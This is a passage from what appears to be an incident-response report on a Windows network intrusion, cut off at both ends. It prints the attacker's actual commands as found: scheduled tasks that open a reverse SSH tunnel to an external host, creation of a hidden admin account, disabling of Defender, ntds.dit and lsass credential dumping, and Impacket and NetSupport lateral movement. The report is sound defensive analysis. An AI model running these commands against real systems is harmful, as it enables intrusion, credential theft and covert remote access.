wlog.event_data.Details: C:\\Users\\username\\AppData\\Roaming\\eHNjggZ\\presentationhost.exe\n```\n\nIn addition, a scheduled task was created to launch OpenSSH SSH Server with a specific configuration altered to make OpenSSH listen locally on port 2222 instead of 22.\n\n```\nschtasks.exe /create /sc minute /mo 1 /tn \"SSH Server\" /rl highest /tr \"C:\\ProgramData\\sshd\\sshd.exe -f C:\\ProgramData\\sshd\\config\\sshd_config\"\n```\n\nFollowing the previous command, another scheduled task was created to establish a reverse SSH tunnel to the attacker’s server. See the lateral movement section to understand how this aided the attacker’s activities.\n\n```\nschtasks.exe /create /sc minute /mo 1 /tn \"SSH Key Exchange\" /rl highest /tr \"C:\\ProgramData\\sshd\\ssh.exe -i C:\\ProgramData\\sshd\\config\\keys\\id_rsa -N -R 369:127.0.0.1:2222 root@185.206.146.129 -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=15\"\n```\n\nThe entire process related to OpenSSH and its persistence was automated by the threat actors through a script named `install.bat`. In this case, the script generated a new private key using `ssh-keygen` and corrected the permissions on the file using `icacls`; this is required because if the permissions are too open on the private key, SSH will exit with an error. More details regarding the SSH tunneling command executed within the scheduled task can be seen under the Command and Control section.\n\n```image\nAlt: SSH Keygen\nDescription: The image shows a snippet of a batch script named 'install.bat' displayed in a code editor. The script contains commands related to the generation and management of SSH keys, setting permissions with 'icacls', and creating scheduled tasks for an SSH server and key exchange. The commands indicate an automated process for establishing persistence and facilitating SSH connections for potential unauthorized access.\nTranscription: |\n  @echo off\n  ssh-keygen -f %programdata%\\sshd\\config\\id_rsa -t rsa -N \"\"\n  icacls %programdata%\\sshd\\config\\keys\\id_rsa /inheritance:r\n  icacls %programdata%\\sshd\\config\\keys\\id_rsa /grant:r \"%username%\":\"(R)\"\n  icacls %programdata%\\sshd\\config\\id_rsa /inheritance:r\n  schtasks.exe /create /sc minute /mo 1 /tn \"SSH Server\" /rl highest /tr \"%programdata%\\sshd\\sshd.exe -f %programdata%\\sshd\\config\\sshd_config\"\n  schtasks.exe /create /sc minute /mo 1 /tn \"SSH Key Exchange\" /rl highest /tr \"%programdata%\\sshd\\ssh.exe -i %programdata%\\sshd\\config\\keys\\id_rsa -N -R 369:127.0.0.1:2222 root@185.206.146.129 -o StrictHostKeyChecking=no\"\n```\n\nThe threat actor created a local user account and added the user to the Administrators and Remote Desktop Users groups. The newly created user account was named `WDAGUtilityAccount2` to blend in with the default user account `WDAGUtilityAccount` present on Windows.\n\n```\nnet  user WDAGUtilityAccount2 Decryptme1488@ /add\nnet  localgroup Administrators WDAGUtilityAccount2 /add\nnet  localgroup \"Remote Desktop Users\" WDAGUtilityAccount2 /add\n```\n\nLastly, the threat actor made use of NIM based tools to authenticate via pass-the-hash and to create a new local administrator user.\n\n```image\nAlt: NIM Tools\nDescription: The image displays a table containing event logs related to process executions. It includes columns for 'event.provider', 'event.code', 'process.parent.command_line', and 'process.command_line'. The data shows two entries from 'Microsoft-Windows-Sysmon', detailing commands executed by 'cmd.exe' that are associated with user account manipulation via 'pth_createuser.exe' and 'pth_addadmin.exe', indicating activities related to pass-the-hash techniques.\nTranscription: |\n  | event.provider           | event.code | process.parent.command_line | process.command_line                                  |\n  | ------------------------ | ---------- | --------------------------- | ----------------------------------------------------- |\n  | Microsoft-Windows-Sysmon | 1          | C:\\Windows\\system32\\cmd.exe | pth_createuser.exe --ip= --domain --username= --hash= |\n  | Microsoft-Windows-Sysmon | 1          | C:\\Windows\\system32\\cmd.exe | pth_addadmin.exe --ip= --domain --username= --hash=   |\n```\n\nThe following demonstrates the possible command line parameters of this tool.\n\n```image\nAlt: NIM Command\nDescription: The image displays a command-line interface showing the usage options for a tool named 'pth_addadmin.exe'. It outlines various command-line options available for the tool, including flags for help, IP address, domain, username, and hash. This information is relevant for understanding how the tool can be used to manage user accounts, particularly in the context of pass-the-hash attacks.\nTranscription: |\n  λ pth_addadmin.exe -h\n  pth_addadmin.exe\n  Usage:\n    [options]\n  \n  Options:\n    -h, --help\n    -i, --ip=IP\n    -d, --domain=DOMAIN\n    -u, --username=USERNAME\n    -h, --hash=HASH\n```\n\n```image\nAlt: NIM Command\nDescription: The image shows a command-line interface displaying the usage instructions and options for a tool named `pth_createuser.exe`. The options include flags for help, IP, domain, username, and hash. This is likely related to a technique for creating user accounts through pass-the-hash methods in a cybersecurity context.\nTranscription: |\n  λ pth_createuser.exe -h\n  pth_createuser.exe\n  Usage:\n      [options]\n  \n  Options:\n      -h, --help\n      -i, --ip=IP\n      -d, --domain=DOMAIN\n      -u, --username=USERNAME\n      -h, --hash=HASH\n```\n\nLooking at the strings present in the files we can discover that these are compiled NIM binaries.\n\n```image\nAlt: NIM Strings\nDescription: The image displays a detailed table that outlines various properties of files related to a cybersecurity context. It includes columns such as 'encoding', 'size (bytes)', 'location', 'flag', 'label', 'group', 'technique', and 'value'. Notably, several entries are highlighted in red, suggesting they are of particular interest or relevance, such as 'fatal.nim', 'options.nim', and 'oserr.nim'. This table likely serves to provide insights into the file structures or behaviors of certain NIM binaries used in a cyber threat scenario.\nTranscription: |\n  | encoding (2) | size (bytes) | location | flag (24) | label (253) | group (12) | technique (8) | value (11024)      |\n  | ------------ | ------------ | -------- | --------- | ----------- | ---------- | ------------- | ------------------ |\n  | ascii        | 3            | .text    | -         | file        | -          | -             | t.H                |\n  | ascii        | 18           | .rdata   | -         | file        | -          | -             | fatal.nim          |\n  | ascii        | 6            | .rdata   | -         | file        | -          | -             | io.nim             |\n  | ascii        | 6            | .rdata   | -         | file        | -          | -             | fatal.nim          |\n  | ascii        | 11           | .rdata   | -         | file        | -          | -             | parseutils.nim     |\n  | ascii        | 9            | .rdata   | -         | file        | -          | -             | strutils.nim       |\n  | ascii        | 11           | .rdata   | -         | file        | -          | -             | streams.nim        |\n  | ascii        | 6            | .rdata   | -         | file        | -          | -             | @Ws2_32.dll        |\n  | ascii        | 6            | .rdata   | -         | file        | -          | -             | @Ws2_32.dll        |\n  | ascii        | 7            | .rdata   | -         | file        | -          | -             | oserr.nim          |\n  | ascii        | 11           | .rdata   | -         | file        | -          | -             | os.nim             |\n  | ascii        | 6            | .rdata   | -         | file        | -          | -             | net.nim            |\n  | ascii        | 11           | .rdata   | -         | file        | -          | -             | @Bcrypt.dll        |\n  | ascii        | 7            | .rdata   | -         | file        | -          | -             | @Bcrypt.dll        |\n  | ascii        | 6            | .rdata   | -         | file        | -          | -             | o.h                |\n  | ascii        | 12           | .idata   | -         | file        | -          | -             | options.nim        |\n  | ascii        | 18           | overlay  | -         | file        | -          | -             | backend.nim        |\n  | ascii        | 25           | .29      | -         | file        | -          | -             | KERNEL32.dll       |\n  | ascii        | 6            | .55      | -         | file        | -          | -             | msvcrt.dll         |\n  | ascii        | 6            | .55      | -         | file        | -          | -             | i386.h             |\n  | ascii        | 20           | overlay  | -         | file        | -          | -             | gbl-ctors.h        |\n  | ascii        | 18           | overlay  | -         | file        | -          | -             | libgcc2.c          |\n  | ascii        | 15           | overlay  | -         | file        | -          | -             | crtexe.c           |\n  | ascii        | 17           | overlay  | -         | file        | -          | -             | cygming-crtbegin.c |\n  | ascii        | 16           | overlay  | -         | file        | -          | -             | rhash_md4.c        |\n  | ascii        | 16           | overlay  | -         | file        | -          | -             | stdlib_io.nim.c    |\n  | ascii        | 18           | overlay  | -         | file        | -          | -             | stdlib_math.nim.c  |\n  | ascii        | 16           | overlay  | -         | file        | -          | -             | stdlib_times.nim.c |\n  | ascii        | 16           | overlay  | -         | file        | -          | -             | stdlib_os.nim.c    |\n  | ascii        | 16           | overlay  | -         | file        | -          | -             | stdlib_sets.nim.c  |\n  | ascii        | 16           | overlay  | -         | file        | -          | -             | stdlib_net.nim.c   |\n  | ascii        | 16           | overlay  | -         | file        | -          | -             | stdlib_md5.nim.c   |\n  | ascii        | 11           | overlay  | -         | file        | -          | -             | @mpth.nim.c        |\n```\n\nSifting further through the strings, we stumble on the command used to create the user account.\n\n```image\nAlt: User Account Command\nDescription: The image displays a snippet from a disassembled binary or a debugger output, showcasing strings related to user account creation commands. It includes lines with ASCII representations, highlighting the command used to add a new user account ('net user localend Decryptme7 /add'). The format suggests that this is part of an analysis of malware or a cyber threat, revealing the underlying commands executed during an intrusion.\nTranscription: |\n  | ascii | 13 | .rdata | - | format-string | - |\n  | ascii | 49 | .rdata | - | format-string | - | @%COMSPEC% /C \"net user localend Decryptme7 /add\" |\n  | ascii | 41 | .rdata | - | format-string | - | _mather(); %s in %s(%g, %g) (retval=%g) |\n```\n\n```\n@%COMSPEC% /C \"net user localend Decryptme7 /add\"\n```\n\nWe can also see the command that was used to attempt to add the user to the administrators group.\n\n```image\nAlt: Add User Command\nDescription: The image displays a section of code or output related to a scripting or programming context. It includes lines of code that appear to be related to user account management in a Windows environment, specifically commands utilizing `net user` and `net localgroup` commands. The highlighted line indicates a command to add a user to the Administrators group, showcasing how commands are structured in a terminal or command-line interface.\nTranscription: |\n  @%COMSPEC% /C \"net user localend Decryptme7 /add\"\n  @%COMSPEC% /C \"net localgroup Administrators localend /add\"\n  _mather(); %s in %g, %g (retval=%g)\n```\n\nWe did not observe any backdoor account created after execution. When we performed our own testing, we saw the tools failed to work and would return an error rather than create an account.\n\n## Defense Evasion\n\nDuring this intrusion, the threat actor was primarily concerned with evading detection by Microsoft Defender. This can be seen multiple times throughout the intrusion where the threat actor checked the historical alerts from Defender using `powershell Get-MpThreat` after conducting credential harvesting or lateral movement actions.\n\nDuring the intrusion, we observed multiple attempts to add exclusions and ultimately trying to disable the local Defender using below commands. The threat actor made several typos during the command execution, indicating a hands-on approach rather than a scripted one.\n\n```\npowershell  Get-MpThreat\npowershell  Get-MpPreference\npowershell  Add-MpPreference -ExclustionPath c:\\users\\public\npowershell  Add-MpPreference -ExclusionPath c:\\users\\public\npowershell  Add-MpPreference -ExclusionProcess c:\\users\\public\\mpms.exe\npowershell  Add-MpPreference -DisableBehaviourMonitoring True\npowershell  Add-MpPreference -DisableBehaviorMonitoring True\npowershell  Add-MpPreference -DisDisableRealtimeMonitoring True\n```\n\nThe mpms executable from the above commands was a renamed ProcDump binary. It was likely renamed in an attempt to avoid detection.\n\n```image\nAlt: ProcDump\nDescription: The image displays a detailed output from a process creation event related to the use of the ProcDump utility. Key information includes the technique ID (T1059), the UTC time of the event, process IDs, image path, and the command line used to execute the utility. It highlights important attributes such as the product ('ProcDump'), the company ('Sysinternals'), and the original file name, providing context on the usage of ProcDump in the intrusion scenario described. The output also indicates the user and session details, along with integrity level and hashes relevant for forensic analysis.\nTranscription: |\n  Process Create:\n  RuleName: technique_id=T1059, technique-name=Command-Line Interface\n  UtcTime:\n  ProcessGuid: {1dc91c81-57ba-63d3-2000-000000000000}\n  ProcessId: 38\n  Image: C:\\Users\\nmps.exe\n  FileVersion: 11.0\n  Description: Sysinternals process dump utility\n  Product: ProcDump\n  Company: Sysinternals - www.sysinternals.com\n  OriginalFileName: procdump\n  CommandLine: nmps.exe -acceptteula -ma 632\n  CurrentDirectory: c:\\Users\\\n  User:\n  LogonGuid: {1dc91c81-57ba-63d0-92e4-c73000000000}\n  LogonId: 0x37249E\n  TerminalSessionId: 0\n  IntegrityLevel: High\n  Hashes: SHA1=43EA521E04836361360C4DCA54B5F4B5D5=6B17C796D6...\n  ParentProcessGuid: {1dc91c81-043a-63d3-71d0-000000000000}\n  ParentProcessId: 1172\n  ParentImage: C:\\Windows\\System32\\cmd.exe\n  ParentCommandLine: C:\\Windows\\system32\\cmd.exe\n```\n\nAfter some activity, the threat actor entered the ‘Scans’ directory of Microsoft’s Defender software, located under:\n\n```\nC:\\ProgramData\\Microsoft\\Windows Defender\\Scans\\History\\\n```\n\nIn addition to checking the Windows Defender historical scan files, the threat actor once again used the `Get-MpThreat` Cmdlet to query the history of threats detected by Windows Defender.\n\nDuring the intrusion, the threat actor relied heavily on the toolkit **Impacket** (especially _atexec.py_ and _wmiexec_). To facilitate some of its capabilities, the host-based firewall was modified before the actual execution of atexec.py and wmiexec executions:\n\n```\ncmd.exe /C netsh advfirewall firewall add rule dir=in name=\"DCOM\" program=C:\\Windows\\system32\\svchost.exe service=rpcss action=allow protocol=TCP localport=135 > C:\\Windows\\Temp\\VlPWyecW.tmp 2>&1\ncmd.exe /C netsh advfirewall firewall add rule dir=in name=\"DCOM\" program=C:\\Windows\\system32\\svchost.exe service=rpcss action=allow protocol=TCP localport=135 > C:\\Windows\\Temp\\pOrnerOW.tmp 2>&1\ncmd.exe /C netsh advfirewall firewall add rule dir=in name =\"WMI\" program=C:\\Windows\\system32\\svchost.exe service=winmgmt action = allow protocol=TCP localport=any > C:\\Windows\\Temp\\XsssmLZZ.tmp 2>&1\ncmd.exe /C netsh advfirewall firewall add rule dir=in name =\"UnsecApp\" program=C:\\Windows\\system32\\wbem\\unsecapp.exe action=allow > C:\\Windows\\Temp\\HaALurWi.tmp 2>&1\ncmd.exe /C netsh advfirewall firewall add rule dir=out name =\"WMI_OUT\" program=C:\\Windows\\system32\\svchost.exe service=winmgmt action=allow protocol=TCP localport=any > C:\\Windows\\Temp\\WkiMfXXo.tmp 2>&1\n```\n\nMultiple times during the intrusion, the threat actor made use of cabinet files (.cab). These are archive files, which support lossless data compression. They are mainly used to distribute device drivers and system files. However, in this case, the actor used its functionality similarly to a traditional .zip archive and deployed its contents under the _programdata_ directory.\n\n```\ncmd.exe /Q /c expand cache.cab -F:* c:\\programdata\n```\n\nAfter decompression, we found a **NetSupport** executable disguised as a Windows component. The executable file was named `mswow86.exe`. The threat actor created a scheduled task to run the binary on every logon.\n\n```\ncmd.exe /Q /c start \"\" %%programdata%%\\schcache\\mswow86.exe\ncmd.exe /Q /c schtasks.exe /create /sc onlogon /tn \"Wow64 Subsystem\" /rl highest /tr \"%%programdata%%\\schcache\\mswow86.exe\n```\n\nAll the chosen names appear to represent a ‘legitimate’ Windows component:\n\n- The name for the executable (`mswow86.exe`)\n- The storage location of this executable (`%programdata%\\schache\\`)\n- The scheduled task name (`Wow64 Subsystem`)\n\n## Credential Access\n\nWe observed the threat actor dumping the **ntds.dit** database on two different domain controllers using a batch script, which then executed the command described in here:\n\n```\npowershell.exe  \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\\users\\public\\ntds' q q\"\npowershell.exe  \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\\ProgramData\\ntdsutil' q q\"\n```\n\nAs seen in the Defense Evasion section, the actor used the Sysinternals tool ProcDump. The threat actor executed a command to identify the PID of the lsass.exe process. This allowed them to target the correct process to dump lsass:\n\n```image\nAlt: ProcDump Command\nDescription: The image displays technical details related to the Windows 'find.exe' utility. It includes attributes such as the file path (C:\\Windows\\System32\\find.exe), a brief description of the utility (Find String (grep) Utility), product information (Microsoft Windows Operating System), and company details (Microsoft Corporation). Additionally, it shows the command line execution ('find /i \"lsas\"') and the current directory context (c:\\Users\\Public\\). This information is pertinent to understanding how the threat actor utilized the command in the context of credential access.\nTranscription: |\n  Image: C:\\Windows\\System32\\find.exe\n  FileVersion:\n  Description: Find String (grep) Utility\n  Product: Microsoft® Windows® Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: FIND.EXE\n  CommandLine: find /i \"lsas\"\n  CurrentDirectory: c:\\Users\\Public\\\n```\n\nIt appears this will not work, as there is no directory for the _find_ command, but the actor likely piped it together, as we saw execution of **tasklist** at the same time:\n\n```image\nAlt: Tasklist Command\nDescription: The image displays detailed properties of the 'tasklist.exe' executable file located in the 'C:\\Windows\\System32\\' directory. It includes metadata such as the file version, a description stating that it lists the current running tasks, product information indicating it is part of the Microsoft Windows Operating System, and the company as Microsoft Corporation. Additionally, the original file name and command line used to execute the file are also provided.\nTranscription: |\n  Image: C:\\Windows\\System32\\tasklist.exe\n  FileVersion:\n  Description: Lists the current running tasks\n  Product: Microsoft® Windows® Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: tasklist.exe\n  CommandLine: tasklist\n```\n\nThis is likely the result of executing something like the following (`tasklist | find /i \"lsas\"`):\n\n```image\nAlt: Tasklist Find\nDescription: The image shows a command line interface displaying the output of the command `tasklist | find /i \"lsas\"`. The output indicates that the `lsass.exe` process is running with a PID of 564, and it is using approximately 22.660 K of memory. This command is likely part of a technique used by a threat actor to identify the lsass.exe process for credential dumping.\nTranscription: |\n  C:\\> tasklist | find /i \"lsas\"\n  lsass.exe             564 Services                   0      22,660 K\n```\n\nUsing the renamed ProcDump utility, the threat actor dumps the **lsass.exe** process, which can be used to get more credential information:\n\n```\nmpms.exe  -accepteula -ma 632\nmpms.exe  -accepteula -ma 716\n```\n\n## Discovery\n\nThe attackers executed several familiar discovery commands on the targeted systems. These were related to the discovery of information on users, hosts and the network configuration. The threat actor connected via the NetSupport agent and then started running commands via a spawned instance of **cmd.exe**.\n\n```image\nAlt: Discovery Commands\nDescription: The image depicts a flowchart that outlines the connection between the NetSupport application (specifically 'presentationhost.exe') and the execution of discovery commands via 'cmd.exe'. It shows multiple instances of 'remcmdstub.exe' with different process IDs, indicating their relationship to the command line interface used for executing various discovery commands during a cyber intrusion. The flowchart visually represents how the NetSupport agent is leveraged by the threat actor to execute commands on the targeted system.\nTranscription: |\n  ┌──────────────────────────────────────────────────────────────┐\n  │                          NetSupport                          │\n  │                     (presentationhost.exe)                   │\n  ├──────────────────────────────────────────────────────────────┤\n  │ remcmdstub.exe 2544 2524 2556 2560 %COMSPEC%                 │\n  │ remcmdstub.exe 2320 2568 1528 2352 %COMSPEC%                 │\n  │ remcmdstub.exe 2344 2328 2356 2360 %COMSPEC%                 │\n  │                           cmd.exe                            │\n  │                          Discovery Commands                  │\n  └──────────────────────────────────────────────────────────────┘\n```\n\nBelow are the first batch of executed discovery commands observed. As seen during this entire intrusion, the threat actor makes small mistakes, either with typos or in command functionality:\n\n```\nwhoami\nnet user\nnet user /domain\nwhoami /all\nnet user <PRIV_ACCOUNT>\nnet group \"Domain Admins\" /domain\nsysteminfo\ncmdkey /list\n```\n\nWe observed the threat actor quickly query for a specific account. This account is a local admin and a domain admin. However, this account was not activated and the actor tried to enable it, making a few mistakes along the way:\n\n```\nnltest /dclist:<REDACTED>\ncmdkey /add:<DC_NAME> /user:<DOMAIN>\\<PRIV_ACC> /pass:REDACTED\nnet user <PRIV_ACC> /domain\nwhoami\nnet user <USER_ACCOUNT> /domain\ncmdkey /del:<DC_NAME>\ncmdkey /add:\"<DC_NAME>\" /user:<DC_NAME>\\<PRIV_ACC> /pass:REDACTED\ncmdkey /del:\"<DC_NAME>\"\nnet user <PRIV_ACCOUNT>\ncmdkey /add:\"<DC_NAME>\" /user:<DC_NAME>\\<PRIV_ACC> /pass:REDACTED\nnet user /add:\"<BEACHHOST>\" /user:<DOMAIN_NAME><PRIV_ACC>/pass:REDACTED\ncmdkey /list\ncmdkey /del:\"<DC_NAME>\"\ncmdkey /del:\"<BEACHHOST>\"\n```\n\nWe observe a couple of mistakes, as a result of hands-on activity and struggling to get things working:\n\n- The first _cmdkey_ is actually correct usage, however the account was not activated.\n- Using _/add_ requires the usage of domain credentials, not credentials of machine.\n- Adding quotes to a command, where it does not matter.\n\nAfter this endeavor, the threat actor tried elsewhere, looking around for interesting information related to the **SYSVOL** shares. Additionally, the actor looked for the presence of **SSH**. This was not installed on the system, so the threat actor installed their own SSH server, as can be seen under the PERSISTENCE section. Additionally, the threat actor tried his luck to find additional domain controllers:\n\n```\nnet view \\\\<DOMAIN_NAME>.local\nnet view \\\\<DOMAIN_NAME>.local\\sysvol\nnet view \\\\<DOMAIN_NAME>.local\\SYSVOL\nwhoami /all\ntasklist\nfind /i \"ssh\"\nping -n 1 <DOMAIN_NAME>.local\nping -n 1 <DC1>.<DOMAIN_NAME>.local\nping -n 1 <DC2>.<DOMAIN_NAME>.local\nping -n 1 <DC3>.<DOMAIN_NAME>.local\narp -a\nping -n 1 REDACTED\nping -n 1 -a REDACTED\nping -n 1 -a REDACTED\nping -n 1 -a REDACTED\nnet view REDACTED\n```\n\nIn addition to the recognizable atexec.py characteristics, this excellent read explains how to hunt for atexec.py in the Windows event logs:\n\n```\ncmd.exe /C net group /domain > C:\\Windows\\Temp\\aWatKmSa.tmp 2>&1\n```\n\nResulted in:\n\n```image\nAlt: Event Log\nDescription: The image displays a Windows Event Log entry related to the Task Scheduler. It indicates that a task identified by a unique GUID was launched by the user 'System'. The task is named '\\aWatKmSa', suggesting it may be part of a scheduled activity, possibly linked to the malicious actions described in the context.\nTranscription: |\n  Event 110, TaskScheduler\n  \n  General\n  Task Scheduler launched \"{41a2e59b-656e-4f99-bb3c-b3bfc5e77354}\" instance of task \"\\aWatKmSa\" for user \"system\".\n```\n\nand three seconds later in:\n\n```image\nAlt: Event Log\nDescription: The image displays an event log entry from the Windows Event Viewer, specifically Event ID 141 related to TaskScheduler. The log indicates that a user, identified as 'Administrator', deleted a Task Scheduler task named '\\aWatKmSa'. The entry is organized into two tabs: 'General' and 'Details', showing relevant information about the event.\nTranscription: |\n  Event 141, TaskScheduler\n  \n  General\n  User <REDACTED> \"Administrator\" deleted Task Scheduler task \"\\aWatKmSa\"\n```\n\nAfter this, wmiexec is observed:\n\n```\ncmd.exe /Q /c cmdkey /list 1> \\\\127.0.0.1\\ADMIN$\\__REDACTED 2>&1\ncmd.exe /Q /c dor 1> \\\\127.0.0.1\\ADMIN$\\____REDACTED  2>&1\ncmd.exe /Q /c whoami 1> \\\\127.0.0.1\\ADMIN$\\____REDACTED  2>&1\ncmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\____REDACTED  2>&1\ncmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\____REDACTED  2>&1\ncmd.exe /Q /c whoami 1> \\\\127.0.0.1\\ADMIN$\\____REDACTED  2>&1\ncmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\____REDACTED  2>&1\ncmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\____REDACTED  2>&1\ncmd.exe /Q /c cd programdata 1> \\\\127.0.0.1\\ADMIN$\\____REDACTED  2>&1\ncmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\____REDACTED  2>&1\ncmd.exe /Q /c ls 1> \\\\127.0.0.1\\ADMIN$\\____REDACTED  2>&1\ncmd.exe /Q /c dir 1> \\\\127.0.0.1\\ADMIN$\\____REDACTED  2>&1\ncmd.exe /Q /c expand cache.cab -F:* c:\\programdata 1> \\\\127.0.0.1\\ADMIN$\\____REDACTED  2>&1\ncmd.exe /Q /c whoami /all 1> \\\\127.0.0.1\\ADMIN$\\____REDACTED  2>&1\n```\n\nAfter the _Impacket_ activity, the threat actor returned later to a domain controller and a backup server, where additional tooling was used for discovery. The first was PingCastle, an active directory auditing tool. On the domain controller, the threat actor executed the following commands:\n\n```\nwhoami\nnet  group \"Domain Admins\"\nquser\nC:\\ProgramData\\start.bat\n➝ starting \"pingcastle.exe --healthcheck --level Full\"\nC:\\ProgramData\\ntds.bat\n  ➝ script to dump the ntds\n```\n\nThe second one was the SoftPerfect Network Scanner. This utility is commonly used by threat actors. While a paid utility, many use the free trial version. However, during this intrusion, the actor clearly did not pay for its version, as they brought their own keygen. On the backup server, the threat actor executed the following commands:\n\n```\n \"C:\\Program Files\\7-Zip\\7zG.exe\" x -o\"C:\\Users\\Public\\netscan_portable\\\" -spe -an -ai#7zMap24244:76:7zEvent17814\n\nC:\\Users\\Public\\netscan_portable\\64-bit\\SoftPerfect_<REDACTED>Patch_Keygen_v2<REDACTED>.exe\"\n\"C:\\Users\\Public\\netscan_portable\\64-bit\\netscan.exe\"\n```\n\nDuring the later stage of the intrusion, the threat actor dumped the event 4624 logs from a domain controller. These were written to the file mf.txt. This file was later added to a zip archive. The file was not looked at on the host it was dumped on. The dumping of these logs may have been to review user logon activity across the environment.\n\n```\npowershell  -w hidden -C \"Get-WinEvent -Logname 'security' -FilterXPath '*[System[EventID=4624]]' -MaxEvents 1 | sort-object timeCreated | select-object -ExpandProperty message\"\npowershell  -w hidden -C \"Get-WinEvent -Logname 'security' -FilterXPath '*[System[EventID=4624]]' | sort-object timeCreated | select-object -ExpandProperty message\"\n```\n\n## Lateral Movement\n\nThe threat actor heavily used the reverse SSH tunnel discussed within the Command and Control section to assist in lateral movement. Through this tunnel, the threat actor was able to proxy their access from the beachhead to other assets in the network using a handful of different techniques, including WMI, and RDP.\n\nAs mentioned in the discovery section, Impacket’s atexec module was utilized within the SSH tunnel to proxy traffic to a domain controller to assist with lateral movement. In between executions of atexec, we see Windows Security event logs that match behavior of lateral movement:\n\n```image\nAlt: Lateral Movement\nDescription: The image displays a table containing two rows of security event log information, specifically event IDs 4624 and 4634. The first row describes the logon event, indicating the use of NTLM protocol with details about two logins: one for task creation and another for retrieving results. The second row outlines the logoff event that corresponds to the same login ID as the previous event, noting the time taken to execute the command between the logon and logoff.\nTranscription: |\n  | Event ID | Log Type | Description                                                                                                                                          |\n  | -------- | -------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |\n  | 4624     | Security | Logon type 3 and NTLM protocol used - 2 logins one for the task creation and the second is for retrieving the results.                               |\n  | 4634     | Security | Logoff with the same login ID as the login event above. The time between the first login and its logoff indicates the time taken to run the command. |\n```\n\n```image\nAlt: Lateral Movement\nDescription: The image displays a table of Windows Security event logs, detailing various events related to user logon activities. It includes columns for timestamps, event codes, related users, authentication package names, logon IDs, logon types, and command lines associated with the processes. Key highlights include the use of NTLM for authentication and specific commands executed, such as 'atexec' found between user login and logoff events. The visual layout aids in understanding the sequence and nature of actions performed during lateral movement within a network.\nTranscription: |\n  | @timestamp               | event.code | related.user  | winlog.event_data.AuthenticationPackageName | winlog.logon.id | winlog.event_data.LogonType | process.parent.command_line                                     | process.command_line |\n  | ------------------------ | ---------- | ------------- | ------------------------------------------- | --------------- | --------------------------- | --------------------------------------------------------------- | -------------------- |\n  | 2023-01-24T10:56:02.797Z | 4624       | Administrator | NTLM                                        | 0x30e59de       | 3                           | C:\\Windows\\system32\\svchost.exe -k netsvcs -p                   | -                    |\n  | 2023-01-24T10:56:02.797Z | 4624       | Administrator | NTLM                                        | 0x30e59de       | 3                           | -                                                               | -                    |\n  | 2023-01-24T10:56:02.797Z | 4624       | Administrator | NTLM                                        | 0x30e59de       | 3                           | -                                                               | -                    |\n  | 2023-01-24T10:56:04.976Z | 1          | SYSTEM        | -                                           | -               | -                           | -                                                               | -                    |\n  | 2023-01-24T10:56:05.289Z | 1          | SYSTEM        | -                                           | -               | -                           | -                                                               | -                    |\n  | 2023-01-24T10:56:05.374Z | 1          | SYSTEM        | -                                           | -               | -                           | -                                                               | -                    |\n  | 2023-01-24T10:57:17.847Z | 4634       | Administrator | -                                           | 0x30e59de       | 3                           | cmd.exe /C net group /domain > C:\\Windows\\Temp\\atWKmSa.tmp 2>&1 | net group /domain    |\n  | 2023-01-24T10:57:17.847Z | 4634       | Administrator | -                                           | 0x30e59de       | 3                           | C:\\Windows\\system32\\net1 group /domain                          | -                    |\n```\n\n### SMB\n\nDuring the intrusion, the threat actor used SMB to copy files over to other systems. Here, the files were not sent over the network in the clear, preventing network inspection, but we were able to inspect the file creation and deletion via event ID 5145 for File Share Auditing event. In the logs, we can see the AccessMask of 0x2 during the file write followed by 0x10080 during the file delete action.\n\n```image\nAlt: SMB Activity\nDescription: The image is a screenshot of a log table displaying details related to SMB activity during an intrusion. The table includes columns for event code, IP address, share name, relative target name, subject username, and access mask. Each row represents a file operation related to the 'cache.cab' file, showing repeated events with access masks of '0x2' for file writes and '0x10080' for file deletes. This log data is crucial for analyzing lateral movement techniques used by threat actors.\nTranscription: |\n  | event.code | winlog.event_data.ipAddress   | winlog.event_data.ShareName | winlog.event_data.RelativeTargetName | winlog.event_data.SubjectUserName | winlog.event_data.AccessMask |\n  | ---------- | ----------------------------- | --------------------------- | ------------------------------------ | --------------------------------- | ---------------------------- |\n  | 5145       | 10. . . . . . . . . . . . . . | \\\\*\\CS                      | programdata\\cache.cab                | Administrator                     | 0x2                          |\n  | 5145       | 10. . . . . . . . . . . . . . | \\\\*\\CS                      | programdata\\cache.cab                | Administrator                     | 0x2                          |\n  | 5145       | 10. . . . . . . . . . . . . . | \\\\*\\CS                      | programdata\\cache.cab                | Administrator                     | 0x2                          |\n  | 5145       | 10. . . . . . . . . . . . . . | \\\\*\\CS                      | programdata\\cache.cab                | Administrator                     | 0x2                          |\n  | 5145       | 10. . . . . . . . . . . . . . | \\\\*\\CS                      | programdata\\cache.cab                | Administrator                     | 0x2                          |\n  | 5145       | 10. . . . . . . . . . . . . . | \\\\*\\CS                      | programdata\\cache.cab                | Administrator                     | 0x2                          |\n  | 5145       | 10. . . . . . . . . . . . . . | \\\\*\\CS                      | programdata\\cache.cab                | Administrator                     | 0x2                          |\n  | 5145       | 10. . . . . . . . . . . . . . | \\\\*\\CS                      | programdata\\cache.cab                | Administrator                     | 0x2                          |\n  | 5145       | 10. . . . . . . . . . . . . . | \\\\*\\CS                      | programdata\\cache.cab                | Administrator                     | 0x2                          |\n  | 5145       | 10. . . . . . . . . . . . . . | \\\\*\\CS                      | programdata\\cache.cab                | Administrator                     | 0x10080                      |\n```\n\n### WMI\n\nImpacket’s wmiexec tool was used to pivot across the environment, extract the archived file `cache.cab`, and execute scheduled tasks to run NetSupport RAT on remote systems.\n\n```image\nAlt: WMI Activity\nDescription: The image displays a table detailing the lateral movement activity captured over a span of two days in a cybersecurity context. Each row lists timestamps, event codes, hostnames (e.g., 'DC #1', 'Backup Server'), and command line executions of the process `wmiprvs.exe` and related commands. The highlighted section indicates the extraction and expansion of an archived file named `cache.cab`, showcasing the steps taken to manipulate and execute commands remotely across different systems.\nTranscription: |\n  | @timestamp     | event.code | agent.hostname | process.parent.command_line                              | process.command_line                                                                  